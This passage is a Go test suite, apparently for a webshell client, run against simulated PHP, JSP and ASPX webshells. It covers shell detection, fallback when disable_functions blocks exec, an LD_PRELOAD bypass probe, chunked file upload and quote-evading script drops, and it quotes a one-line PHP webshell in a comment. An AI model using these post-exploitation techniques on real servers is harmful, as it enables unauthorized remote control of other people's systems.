package session

// http_shell_test.go 验收测试：httptest 起模拟 webshell 目标，覆盖
// 两种 PHP 马型（eval 族 / assert 族，含 exec 被禁降级 shell_exec)、一个 JSP
// 马、一个 ASPX 马；Test/Exec 哨兵正确性、函数降级、大文件分块读写、引号规避
// 落盘执行、错误语义（disable_functions/WAF/HTTP 错误，不伪造成功）。
// 全部为协议族级模拟，不含任何特定靶场值。

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// ---------------- 模拟 PHP 一句话马（eval / assert 两族） ----------------

// phpMock 模拟 @eval($_POST['密码']) / @assert($_POST['密码']):把 POST 字段值
// 当 PHP 代码"执行"（按驱动 payload 形态模式匹配）。
type phpMock struct {
	family  string // eval | assert
	fs      *fakeFS
	pollute string // 响应前后加的回显污染（HTML 噪声）

	mu          sync.Mutex
	disabled    map[string]bool // disable_functions
	mailOn      bool            // mail() 可用（LD_PRELOAD 绕过前提指纹）
	putenvOn    bool            // putenv() 可用
	bypassWorks bool            // 模拟 LD_PRELOAD 构造器真的执行（创建探活标记文件）
	wafExec     bool            // 对执行 payload 返回无哨兵响应（模拟 WAF 吞掉）
	execFns     []string        // 历次执行 payload 选中的函数（断言降级用）
	writeCalls  int             // file_put_contents 调用次数（断言分块用）
	lastOuter   string          // 最近一次执行的外层命令（断言引号规避用）
}

func newPHPMock(family string) *phpMock {
	return &phpMock{family: family, fs: newFakeFS(), disabled: map[string]bool{}}
}

func (m *phpMock) disable(fn string) {
	m.mu.Lock()
	m.disabled[fn] = true
	m.mu.Unlock()
}

func (m *phpMock) isDisabled(fn string) bool {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.disabled[fn]
}

var (
	echoConcatRe = regexp.MustCompile(`^echo "([0-9a-f]{8})"\.\(20\+22\)\."([0-9a-f]{12})";$`)
	markerRe     = regexp.MustCompile(`echo "(?:\\n)?([0-9a-f]{8,})";`)
	writeRe      = regexp.MustCompile(`file_put_contents\(base64_decode\("([A-Za-z0-9+/=]*)"\),base64_decode\("([A-Za-z0-9+/=]*)"\),(\w+)\)`)
	readPathRe   = regexp.MustCompile(`\$f=base64_decode\("([A-Za-z0-9+/=]*)"\)`)
	fseekRe      = regexp.MustCompile(`@fseek\(\$h,(\d+)\)`)
	freadRe      = regexp.MustCompile(`fread\(\$h,(\d+)`)
	execCmdRe    = regexp.MustCompile(`\$c=base64_decode\("([A-Za-z0-9+/=]*)"\)`)
	execFnRe     = regexp.MustCompile(`function_exists\("(\w+)"\)`)
	bypassMarkRe = regexp.MustCompile(`\$mk=base64_decode\("([A-Za-z0-9+/=]*)"\)`)
	unlinkRe     = regexp.MustCompile(`@unlink\(base64_decode\("([A-Za-z0-9+/=]*)"\)\)`)
)

// markers 从 payload 提取哨兵对（首个 echo "S" / 末个 echo "\nE")。
func markers(p string) sentinel {
	all := markerRe.FindAllStringSubmatch(p, -1)
	var m sentinel
	if len(all) > 0 {
		m.start = all[0][1]
		m.end = all[len(all)-1][1]
	}
	return m
}

func (m *phpMock) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	p := r.Form.Get("cmd")
	out := m.eval(p)
	_, _ = w.Write([]byte(m.pollute + out + m.pollute))
}

func (m *phpMock) eval(p string) string {
	// 1) 存活探针：echo "S".(20+22)."E";(PHP 字符串拼接 + 算术求值）
	if g := echoConcatRe.FindStringSubmatch(p); g != nil {
		return g[1] + "42" + g[2]
	}
	// 2) family 分辨探针
	if strings.Contains(p, "debug_backtrace") {
		mk := markers(p)
		return mk.start + m.family + mk.end
	}
	// 3) 能力指纹枚举探针（exec 系 + mail/putenv)
	if strings.Contains(p, `foreach(array("exec"`) {
		mk := markers(p)
		var enabled []string
		for _, fn := range phpExecFuncs {
			if !m.isDisabled(fn) {
				enabled = append(enabled, fn)
			}
		}
		m.mu.Lock()
		if m.mailOn {
			enabled = append(enabled, "mail")
		}
		if m.putenvOn {
			enabled = append(enabled, "putenv")
		}
		m.mu.Unlock()
		return mk.start + strings.Join(enabled, ",") + "," + mk.end
	}
	// 3b) LD_PRELOAD 绕过触发探针：putenv + mail() → 模拟动态链接器执行构造器
	// (bypassWorks 时往探活标记路径写文件，模拟 .so 构造器的 open/write/_exit)。
	if strings.Contains(p, "LD_PRELOAD") {
		mk := markers(p)
		m.mu.Lock()
		mail, putenv, works := m.mailOn, m.putenvOn, m.bypassWorks
		m.mu.Unlock()
		if !mail || !putenv {
			return mk.start + "NOBYPASS\n" + mk.end
		}
		if works {
			if g := bypassMarkRe.FindStringSubmatch(p); g != nil {
				mark, _ := base64.StdEncoding.DecodeString(g[1])
				m.fs.writeFile(string(mark), []byte("K"), false) // 构造器探活标记
			}
			return mk.start + "BYPASSOK\n" + mk.end
		}
		return mk.start + "BYPASSFAIL\n" + mk.end
	}
	// 3c) 静默清理探针：@unlink(base64_decode(...))
	if g := unlinkRe.FindStringSubmatch(p); g != nil && !writeRe.MatchString(p) {
		mk := markers(p)
		path, _ := base64.StdEncoding.DecodeString(g[1])
		m.fs.remove(string(path))
		return mk.start + "\n" + mk.end
	}
	// 4) 写文件
	if g := writeRe.FindStringSubmatch(p); g != nil {
		mk := markers(p)
		path, _ := base64.StdEncoding.DecodeString(g[1])
		data, _ := base64.StdEncoding.DecodeString(g[2])
		m.mu.Lock()
		m.writeCalls++
		m.mu.Unlock()
		if strings.HasPrefix(string(path), "/nowrite/") {
			return mk.start + "WRITEFAIL\n" + mk.end
		}
		m.fs.writeFile(string(path), data, g[3] == "FILE_APPEND")
		return mk.start + "WRITEOK\n" + mk.end
	}
	// 5) 读文件
	if strings.Contains(p, "fopen") {
		mk := markers(p)
		g := readPathRe.FindStringSubmatch(p)
		path, _ := base64.StdEncoding.DecodeString(g[1])
		data, ok := m.fs.readFile(string(path))
		if !ok {
			return mk.start + "READFAIL\n" + mk.end
		}
		var off, size int
		fmt.Sscanf(fseekRe.FindStringSubmatch(p)[1], "%d", &off)
		fmt.Sscanf(freadRe.FindStringSubmatch(p)[1], "%d", &size)
		if off > len(data) {
			off = len(data)
		}
		end := off + size
		if end > len(data) {
			end = len(data)
		}
		return mk.start + base64.StdEncoding.EncodeToString(data[off:end]) + "\n" + mk.end
	}
	// 6) 命令执行
	if g := execCmdRe.FindStringSubmatch(p); g != nil {
		fn := execFnRe.FindStringSubmatch(p)[1]
		cmd, _ := base64.StdEncoding.DecodeString(g[1])
		m.mu.Lock()
		m.execFns = append(m.execFns, fn)
		m.lastOuter = string(cmd)
		waf := m.wafExec
		m.mu.Unlock()
		if waf {
			return "<html>blocked</html>" // 无哨兵:WAF 吞掉
		}
		mk := markers(p)
		if m.isDisabled(fn) {
			return mk.start + "NOFUNC\n" + mk.end // function_exists 为假 → else 分支
		}
		out, _ := m.fs.run(string(cmd))
		return mk.start + out + "\n" + mk.end
	}
	// 7) 未知 payload:PHP parse error → 空回显（马不回哨兵）
	return ""
}

// ---------------- 模拟 JSP / ASPX 命令回显马 ----------------

type jspMock struct {
	fs     *fakeFS
	status int // >0 时直接返回该 HTTP 状态（模拟马被删/WAF）
}

func (m *jspMock) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if m.status > 0 {
		w.WriteHeader(m.status)
		return
	}
	// 真实 Java 容器端点的通用头信号（Tomcat 会话 cookie):auto 判型靠它把
	// sh 命令马区分为 jsp 而非 phpcmd（两者执行通道同构，只能靠协议信号）。
	w.Header().Set("Set-Cookie", "JSESSIONID="+strings.Repeat("a", 32)+"; Path=/")
	_ = r.ParseForm()
	out, _ := m.fs.run(r.Form.Get("cmd"))
	_, _ = w.Write([]byte(out))
}

// phpcmdMock 模拟 PHP 命令执行马（<?php system($_POST['cmd']); ?> 族）:POST
// 字段直接是 shell 命令，马体 exec 后回显 stdout，无 PHP eval 面。phpHeader
// 模拟 X-Powered-By: PHP 头（加固目标常剥头，默认不带——这正是复盘 R1 里被
// 旧 auto 误判成 http_jsp 的形态）。
type phpcmdMock struct {
	fs        *fakeFS
	phpHeader bool
}

func (m *phpcmdMock) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if m.phpHeader {
		w.Header().Set("X-Powered-By", "PHP/8.1.27")
	}
	_ = r.ParseForm()
	out, _ := m.fs.run(r.Form.Get("cmd"))
	_, _ = w.Write([]byte(out))
}

type aspxMock struct{ cmd *fakeCmd }

func (m *aspxMock) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	_, _ = w.Write([]byte(m.cmd.run(r.Form.Get("cmd"))))
}

// ---------------- 测试 ----------------

func probeURL(t *testing.T, h http.Handler) string {
	t.Helper()
	srv := httptest.NewServer(h)
	t.Cleanup(srv.Close)
	return srv.URL
}

func TestProbePHPEvalFamily(t *testing.T) {
	u := probeURL(t, newPHPMock("eval"))
	sh, info, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if info.Kind != "http_php" || info.Lang != "php" {
		t.Fatalf("kind/lang = %s/%s", info.Kind, info.Lang)
	}
	if info.Variant != "eval" {
		t.Fatalf("variant = %q, want eval", info.Variant)
	}
	if len(info.Funcs) != 4 || info.Funcs[0] != "exec" {
		t.Fatalf("funcs = %v, want exec 优先的全量清单", info.Funcs)
	}
	if err := sh.Test(context.Background()); err != nil {
		t.Fatalf("Test: %v", err)
	}
}

func TestProbePHPAssertFamilyExecDisabled(t *testing.T) {
	mock := newPHPMock("assert")
	mock.disable("exec") // exec 被禁 → 探测应降级到 shell_exec
	u := probeURL(t, mock)
	_, info, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if info.Variant != "assert" {
		t.Fatalf("variant = %q, want assert", info.Variant)
	}
	if len(info.Funcs) == 0 || info.Funcs[0] != "shell_exec" {
		t.Fatalf("funcs = %v, want shell_exec 居首(exec 已禁)", info.Funcs)
	}
	for _, f := range info.Funcs {
		if f == "exec" {
			t.Fatalf("exec 已禁不应出现在可用清单: %v", info.Funcs)
		}
	}
}

func TestPHPExecSentinelPollution(t *testing.T) {
	mock := newPHPMock("eval")
	mock.pollute = "<html><body>noise</body></html>" // 业务页噪声包裹
	u := probeURL(t, mock)
	sh, err := NewHTTPShell(u, "cmd", "php")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := sh.probe(context.Background()); err != nil {
		t.Fatalf("probe: %v", err)
	}
	stdout, stderr, err := sh.Exec(context.Background(), "id", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(stdout, "uid=33(www-data)") {
		t.Fatalf("stdout = %q", stdout)
	}
	if strings.Contains(stdout, "noise") || strings.Contains(stdout, "<html>") {
		t.Fatalf("哨兵未能剥离回显污染: %q", stdout)
	}
	if stderr != "" {
		t.Fatalf("webshell stderr 恒为空, got %q", stderr)
	}
}

func TestPHPExecRuntimeFuncFallback(t *testing.T) {
	mock := newPHPMock("eval")
	u := probeURL(t, mock)
	sh, info, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if info.Funcs[0] != "exec" {
		t.Fatalf("探测时 exec 应可用: %v", info.Funcs)
	}
	mock.disable("exec") // 探测后 exec 被禁（php.ini 变更/WAF 规则上线）
	stdout, _, err := sh.Exec(context.Background(), "whoami", 0)
	if err != nil {
		t.Fatalf("Exec 应自动降级 shell_exec: %v", err)
	}
	if strings.TrimSpace(stdout) != "www-data" {
		t.Fatalf("stdout = %q", stdout)
	}
	mock.mu.Lock()
	fns := append([]string(nil), mock.execFns...)
	mock.mu.Unlock()
	if len(fns) != 2 || fns[0] != "exec" || fns[1] != "shell_exec" {
		t.Fatalf("降级路径 = %v, want [exec shell_exec]", fns)
	}
}

func TestPHPExecAllFuncsDisabled(t *testing.T) {
	mock := newPHPMock("eval")
	for _, fn := range phpExecFuncs {
		mock.disable(fn)
	}
	u := probeURL(t, mock)
	sh, info, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("马活着,Probe 应成功: %v", err)
	}
	if len(info.Funcs) != 0 {
		t.Fatalf("funcs = %v, want 空", info.Funcs)
	}
	_, _, err = sh.Exec(context.Background(), "id", 0)
	if err == nil || !strings.Contains(err.Error(), "disable_functions") {
		t.Fatalf("错误语义应为 disable_functions, got %v", err)
	}
}

func TestPHPExecWAFSemantics(t *testing.T) {
	mock := newPHPMock("eval")
	u := probeURL(t, mock)
	sh, _, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	mock.mu.Lock()
	mock.wafExec = true
	mock.mu.Unlock()
	_, _, err = sh.Exec(context.Background(), "id", 0)
	if err == nil {
		t.Fatal("WAF 吞掉执行回显时必须报错,不伪造成功")
	}
	if !strings.Contains(err.Error(), "哨兵") {
		t.Fatalf("错误应带哨兵语义, got %v", err)
	}
}

func TestPHPQuoteEvasionScriptDrop(t *testing.T) {
	mock := newPHPMock("eval")
	u := probeURL(t, mock)
	sh, _, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	// 含单引号与管道的复杂命令 → 必须 base64 落盘再 sh 执行,用完清理。
	stdout, _, err := sh.Exec(context.Background(), "echo 'it works' | tr a-z A-Z", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if strings.TrimSpace(stdout) != "IT WORKS" {
		t.Fatalf("stdout = %q, want IT WORKS", stdout)
	}
	mock.mu.Lock()
	outer := mock.lastOuter
	mock.mu.Unlock()
	if strings.Contains(outer, "'it works'") {
		t.Fatalf("复杂命令不应内联（引号会被多层 shell 撕碎）: %q", outer)
	}
	if !strings.Contains(outer, "base64 -d > /tmp/.artex_") || !strings.Contains(outer, "rm -f /tmp/.artex_") {
		t.Fatalf("应为 base64 落盘 + sh 执行 + 清理: %q", outer)
	}
	if mock.fs.hasPrefixMatch("/tmp/.artex_") {
		t.Fatal("临时脚本用完未清理")
	}
}

func TestPHPSimpleCommandInline(t *testing.T) {
	mock := newPHPMock("eval")
	u := probeURL(t, mock)
	sh, _, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if _, _, err := sh.Exec(context.Background(), "id", 0); err != nil {
		t.Fatalf("Exec: %v", err)
	}
	mock.mu.Lock()
	outer := mock.lastOuter
	mock.mu.Unlock()
	if outer != "id" {
		t.Fatalf("简单命令应内联直发, got %q", outer)
	}
}

func TestPHPLargeFileChunkedRoundTrip(t *testing.T) {
	mock := newPHPMock("eval")
	u := probeURL(t, mock)
	sh, _, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	data := make([]byte, 1_200_000) // > 18 × 64KB → 19 块
	if _, err := rand.Read(data); err != nil {
		t.Fatal(err)
	}
	const path = "/var/www/uploads/payload.bin"
	if err := sh.WriteFile(context.Background(), path, data); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	mock.mu.Lock()
	writes := mock.writeCalls
	mock.mu.Unlock()
	wantWrites := (len(data) + ChunkSize - 1) / ChunkSize
	if writes != wantWrites {
		t.Fatalf("分块写入次数 = %d, want %d(64KB/块)", writes, wantWrites)
	}
	got, err := sh.ReadFile(context.Background(), path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if len(got) != len(data) {
		t.Fatalf("读回长度 = %d, want %d", len(got), len(data))
	}
	for i := range got {
		if got[i] != data[i] {
			t.Fatalf("第 %d 字节不一致", i)
		}
	}
}

func TestPHPFileErrorSemantics(t *testing.T) {
	mock := newPHPMock("eval")
	u := probeURL(t, mock)
	sh, _, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if _, err := sh.ReadFile(context.Background(), "/no/such/file"); err == nil ||
		!strings.Contains(err.Error(), "不存在或无权限") {
		t.Fatalf("读不存在文件应报语义错误, got %v", err)
	}
	if err := sh.WriteFile(context.Background(), "/nowrite/x", []byte("a")); err == nil ||
		!strings.Contains(err.Error(), "不可写") {
		t.Fatalf("写不可写目录应报语义错误, got %v", err)
	}
}

func TestJSPFullFlow(t *testing.T) {
	mock := &jspMock{fs: newFakeFS()}
	u := probeURL(t, mock)
	sh, info, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if info.Kind != "http_jsp" {
		t.Fatalf("kind = %s, want http_jsp", info.Kind)
	}
	stdout, _, err := sh.Exec(context.Background(), "id", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(stdout, "uid=33(www-data)") {
		t.Fatalf("stdout = %q", stdout)
	}
	// 分块写读（JSP 走 shell base64 路径）。
	data := make([]byte, 600_000) // 2 块
	if _, err := rand.Read(data); err != nil {
		t.Fatal(err)
	}
	const path = "/tmp/agent.bin"
	if err := sh.WriteFile(context.Background(), path, data); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	got, err := sh.ReadFile(context.Background(), path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if len(got) != len(data) {
		t.Fatalf("读回长度 = %d, want %d", len(got), len(data))
	}
	for i := range got {
		if got[i] != data[i] {
			t.Fatalf("第 %d 字节不一致", i)
		}
	}
}

func TestJSPHTTPErrorSemantics(t *testing.T) {
	mock := &jspMock{fs: newFakeFS(), status: 403}
	u := probeURL(t, mock)
	_, _, err := Probe(context.Background(), u, "cmd", "jsp")
	if err == nil || !strings.Contains(err.Error(), "403") {
		t.Fatalf("HTTP 403 应如实报错, got %v", err)
	}
}

func TestASPXProbeAndExec(t *testing.T) {
	mock := &aspxMock{cmd: &fakeCmd{fs: newFakeFS()}}
	u := probeURL(t, mock)
	sh, info, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if info.Kind != "http_aspx" || info.Platform != "windows" {
		t.Fatalf("kind/platform = %s/%s", info.Kind, info.Platform)
	}
	stdout, _, err := sh.Exec(context.Background(), "whoami", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(stdout, "network service") {
		t.Fatalf("stdout = %q", stdout)
	}
}

func TestProbeUnreachable(t *testing.T) {
	_, _, err := Probe(context.Background(), "http://127.0.0.1:1/dead.php", "cmd", "auto")
	if err == nil {
		t.Fatal("不可达目标必须报错")
	}
	if !strings.Contains(err.Error(), "马型探测失败") {
		t.Fatalf("错误应汇总各语言探测原因, got %v", err)
	}
}

func TestSecretRestoreRoundTrip(t *testing.T) {
	mock := newPHPMock("assert")
	mock.disable("exec")
	u := probeURL(t, mock)
	sh, _, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	sh.SetID(42)
	sec := sh.Secret()
	if sec.Variant != "assert" || len(sec.Funcs) == 0 || sec.Funcs[0] != "shell_exec" {
		t.Fatalf("secret = %+v", sec)
	}
	// 模拟进程重启:由 secret 恢复,不重新探测。
	got, err := RestoreHTTPShell(42, sec)
	if err != nil {
		t.Fatalf("Restore: %v", err)
	}
	if got.ID() != 42 || got.Kind() != "http_php" {
		t.Fatalf("id/kind = %d/%s", got.ID(), got.Kind())
	}
	stdout, _, err := got.Exec(context.Background(), "whoami", 0)
	if err != nil {
		t.Fatalf("恢复后 Exec: %v", err)
	}
	if strings.TrimSpace(stdout) != "www-data" {
		t.Fatalf("stdout = %q", stdout)
	}
	// 恢复的 funcs 不含 exec,不应先尝试 exec。
	mock.mu.Lock()
	fns := append([]string(nil), mock.execFns...)
	mock.mu.Unlock()
	if len(fns) != 1 || fns[0] != "shell_exec" {
		t.Fatalf("恢复后应直接用 shell_exec, got %v", fns)
	}
}

func TestExecTimeout(t *testing.T) {
	// 目标挂死:Exec 必须在 timeout 内返回错误,而不是永远等。
	slow := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(3 * time.Second)
		_, _ = w.Write([]byte("ok"))
	})
	u := probeURL(t, slow)
	sh, err := NewHTTPShell(u, "cmd", "php")
	if err != nil {
		t.Fatal(err)
	}
	sh.SetFuncs([]string{"shell_exec"})
	start := time.Now()
	_, _, err = sh.Exec(context.Background(), "id", 300*time.Millisecond)
	if err == nil {
		t.Fatal("超时应报错")
	}
	if time.Since(start) > 3*time.Second {
		t.Fatalf("超时未生效,耗时 %v", time.Since(start))
	}
}

// TestDirectClientIgnoresProxyEnv:目标请求必须直连,不走 env 代理。
func TestDirectClientIgnoresProxyEnv(t *testing.T) {
	t.Setenv("HTTP_PROXY", "http://127.0.0.1:1") // 指向死代理;若走了代理请求必败
	t.Setenv("http_proxy", "http://127.0.0.1:1")
	mock := newPHPMock("eval")
	u := probeURL(t, mock)
	_, _, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("走了 env 代理(应直连): %v", err)
	}
}

func TestRegistryConcurrent(t *testing.T) {
	reg := NewRegistry()
	mk := func(id int64) Session {
		u := probeURL(t, newPHPMock("eval"))
		sh, err := NewHTTPShell(u, "cmd", "php")
		if err != nil {
			t.Fatal(err)
		}
		sh.SetID(id)
		return sh
	}
	var wg sync.WaitGroup
	for i := int64(1); i <= 32; i++ {
		wg.Add(1)
		go func(id int64) {
			defer wg.Done()
			reg.Add(mk(id))
			if _, ok := reg.Get(id); !ok {
				t.Errorf("Get(%d) miss", id)
			}
			reg.List()
		}(i)
	}
	wg.Wait()
	if n := len(reg.List()); n != 32 {
		t.Fatalf("List = %d, want 32", n)
	}
	if !reg.Remove(1) {
		t.Fatal("Remove(1) 应成功")
	}
	if _, ok := reg.Get(1); ok {
		t.Fatal("Remove 后 Get 应 miss")
	}
	if reg.Remove(1) {
		t.Fatal("重复 Remove 应 false")
	}
}

// 模拟器自测:未知 payload / 非马响应不会让 Probe 误判。
func TestProbeRejectsNonShell(t *testing.T) {
	u := probeURL(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("<html>welcome</html>"))
	}))
	_, _, err := Probe(context.Background(), u, "cmd", "auto")
	if err == nil {
		t.Fatal("普通页面不应被误判为马")
	}
	if !strings.Contains(err.Error(), "回显摘要") {
		t.Fatalf("失败应带回显摘要不伪造, got %v", err)
	}
}

// url.Values 编码检查:驱动发出的请求是标准表单(模拟器依赖 r.ParseForm)。
func TestPostIsFormEncoded(t *testing.T) {
	var gotCT string
	var gotField url.Values
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotCT = r.Header.Get("Content-Type")
		_ = r.ParseForm()
		gotField = r.PostForm
		_, _ = w.Write([]byte("<html>welcome</html>"))
	}))
	t.Cleanup(srv.Close)
	_, _, _ = Probe(context.Background(), srv.URL, "cmd", "php")
	if gotCT != "application/x-www-form-urlencoded" {
		t.Fatalf("Content-Type = %q", gotCT)
	}
	if gotField.Get("cmd") == "" {
		t.Fatal("密码字段应带 payload")
	}
}

// ---------------- PHP 命令执行马(phpcmd,复盘 R1) ----------------

// TestProbePHPCmdShellAutoNoHeaders:无头信号的 PHP 命令马必须判 phpcmd,
// 绝不允许判 http_jsp(复盘 R1 的实战回归)。
func TestProbePHPCmdShellAutoNoHeaders(t *testing.T) {
	u := probeURL(t, &phpcmdMock{fs: newFakeFS()})
	sh, info, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if info.Kind != "http_phpcmd" || info.Lang != "phpcmd" {
		t.Fatalf("kind/lang = %s/%s, want http_phpcmd/phpcmd(命令马被误判)", info.Kind, info.Lang)
	}
	if info.Variant != "cmd" || info.Platform != "linux" {
		t.Fatalf("variant/platform = %q/%q", info.Variant, info.Platform)
	}
	stdout, _, err := sh.Exec(context.Background(), "id", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(stdout, "uid=33(www-data)") {
		t.Fatalf("stdout = %q", stdout)
	}
}

// TestProbePHPCmdShellAutoPHPHeader:带 X-Powered-By PHP 头同样判 phpcmd。
func TestProbePHPCmdShellAutoPHPHeader(t *testing.T) {
	u := probeURL(t, &phpcmdMock{fs: newFakeFS(), phpHeader: true})
	_, info, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if info.Kind != "http_phpcmd" {
		t.Fatalf("kind = %s, want http_phpcmd", info.Kind)
	}
}

// TestProbePHPCmdExplicitLang:显式 lang=phpcmd 只打命令探针。
func TestProbePHPCmdExplicitLang(t *testing.T) {
	u := probeURL(t, &phpcmdMock{fs: newFakeFS()})
	_, info, err := Probe(context.Background(), u, "cmd", "phpcmd")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if info.Kind != "http_phpcmd" || info.Variant != "cmd" {
		t.Fatalf("info = %+v", info)
	}
}

// TestAutoProbeStillDetectsJSPByContainerHint:Java 容器头信号下 sh 命令马
// 仍判 http_jsp(Tomcat 端点的 JSESSIONID 是通用协议信号)。
func TestAutoProbeStillDetectsJSPByContainerHint(t *testing.T) {
	u := probeURL(t, &jspMock{fs: newFakeFS()})
	_, info, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if info.Kind != "http_jsp" {
		t.Fatalf("kind = %s, want http_jsp(容器头信号判型)", info.Kind)
	}
}

// TestPHPCmdFileRoundTrip:命令马的文件读写走 shell base64 通道(分块)。
func TestPHPCmdFileRoundTrip(t *testing.T) {
	mock := &phpcmdMock{fs: newFakeFS()}
	u := probeURL(t, mock)
	sh, _, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	data := make([]byte, 600_000) // 2 块
	if _, err := rand.Read(data); err != nil {
		t.Fatal(err)
	}
	const path = "/tmp/agent.bin"
	if err := sh.WriteFile(context.Background(), path, data); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	got, err := sh.ReadFile(context.Background(), path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if len(got) != len(data) {
		t.Fatalf("读回长度 = %d, want %d", len(got), len(data))
	}
	for i := range got {
		if got[i] != data[i] {
			t.Fatalf("第 %d 字节不一致", i)
		}
	}
}

// TestPHPCmdQuoteEvasionScriptDrop:命令马复杂命令同样走 base64 落盘引号规避。
func TestPHPCmdQuoteEvasionScriptDrop(t *testing.T) {
	mock := &phpcmdMock{fs: newFakeFS()}
	u := probeURL(t, mock)
	sh, _, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	stdout, _, err := sh.Exec(context.Background(), "echo 'it works' | tr a-z A-Z", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if strings.TrimSpace(stdout) != "IT WORKS" {
		t.Fatalf("stdout = %q", stdout)
	}
}

// TestEvalProbeNotFooledByCmdShell:eval 探针（PHP 专属语法）在命令马面前必须
// 失败——这是 auto 不再把命令马拖进 PHP eval 分支的分界（复盘 R1)。
func TestEvalProbeNotFooledByCmdShell(t *testing.T) {
	u := probeURL(t, &phpcmdMock{fs: newFakeFS()})
	sh, err := NewHTTPShell(u, "cmd", "php")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := sh.probe(context.Background()); err == nil {
		t.Fatal("命令马不应通过 PHP eval 探针")
	}
}

// ---------------- per-session 执行锁与命名空间前缀(复盘 R5) ----------------

// concTracker 统计目标侧并发在途请求峰值。
type concTracker struct {
	h   http.Handler
	cur int32
	max int32
}

func (c *concTracker) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	n := atomic.AddInt32(&c.cur, 1)
	for {
		m := atomic.LoadInt32(&c.max)
		if n <= m || atomic.CompareAndSwapInt32(&c.max, m, n) {
			break
		}
	}
	time.Sleep(30 * time.Millisecond) // 放大并发窗口
	c.h.ServeHTTP(w, r)
	atomic.AddInt32(&c.cur, -1)
}

// TestExecSerializedPerSession:同会话并发 Exec 必须串行（峰值在途 = 1),
// 防共享临时文件/交错回显造成哨兵误报「马失效」（复盘 R5)。
func TestExecSerializedPerSession(t *testing.T) {
	tracker := &concTracker{h: newPHPMock("eval")}
	u := probeURL(t, tracker)
	sh, _, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	var wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if _, _, err := sh.Exec(context.Background(), "id", 0); err != nil {
				t.Errorf("Exec: %v", err)
			}
		}()
	}
	wg.Wait()
	if m := atomic.LoadInt32(&tracker.max); m != 1 {
		t.Fatalf("同会话并发在途峰值 = %d, want 1(per-session 锁未生效)", m)
	}
}

// TestScriptDropTmpPrefix:调用方命名空间前缀注入后，复杂命令落盘脚本按前缀隔离。
func TestScriptDropTmpPrefix(t *testing.T) {
	mock := newPHPMock("eval")
	u := probeURL(t, mock)
	sh, _, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	ctx := WithTmpPrefix(context.Background(), WorkerTmpPrefix(7, 42))
	if _, _, err := sh.Exec(ctx, "echo 'ns test' | tr a-z A-Z", 0); err != nil {
		t.Fatalf("Exec: %v", err)
	}
	mock.mu.Lock()
	outer := mock.lastOuter
	mock.mu.Unlock()
	if !strings.Contains(outer, "base64 -d > /tmp/.artex_7_42_") {
		t.Fatalf("落盘脚本未按 worker 前缀隔离: %q", outer)
	}
	// 未注入前缀时回落默认前缀。
	if _, _, err := sh.Exec(context.Background(), "echo 'ns default' | tr a-z A-Z", 0); err != nil {
		t.Fatalf("Exec: %v", err)
	}
